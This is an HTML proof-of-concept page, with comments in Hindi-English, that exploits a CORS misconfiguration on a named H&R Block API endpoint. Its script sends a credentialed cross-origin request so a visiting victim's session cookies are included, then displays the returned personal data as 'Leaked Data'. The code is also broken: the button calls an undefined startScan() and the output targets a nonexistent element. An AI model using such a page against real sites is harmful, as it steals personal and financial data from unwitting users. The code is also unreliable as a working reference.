<!DOCTYPE html>
<html>
<head>
    <title>Bulk CORS Scanner - H&R Block</title>
    <style>
        body { font-family: sans-serif; padding: 20px; background-color: #1a1a1a; color: #00ff00; }
        .box { border: 1px solid #00ff00; padding: 15px; margin-bottom: 10px; background: #000; border-radius: 5px; }
        .success { color: #00ff00; font-weight: bold; }
        .failed { color: #ff0000; }
        button { padding: 10px 20px; background: #00ff00; color: #000; border: none; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

    <h2>H&R Block - Bulk API Scanner (PoC)</h2>
    <p>Testing for Sensitive Data Leakage across multiple endpoints...</p>
    <button onclick="startScan()">Start Bulk Scan</button>
    
    <div id="results"></div>

<script>
    function fetchSensitiveData() {
        // Hum ab us endpoint ko target kar rahe hain jahan PII leakage ka risk hai
        var target_url = "https://mp.hrblock.com/idl/hrb/idl";
        var xhr = new XMLHttpRequest();

        xhr.open("GET", target_url, true);
        
        // YE SABSE IMPORTANT LINE HAI:
        // Isse browser victim ki cookies (CIAM, UCID) server ko bhejta hai
        xhr.withCredentials = true; 

        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4 && xhr.status == 200) {
                var response = JSON.parse(xhr.responseText);
                
                // Hum response mein specifically CIAM aur UCID dhoondh rahe hain
                document.getElementById("data").innerHTML = "Leaked Data: " + JSON.stringify(response, null, 2);
                
                console.log("Full Leak:", response);
            }
        };
        xhr.send();
    }
</script>
 
</body>
</html>
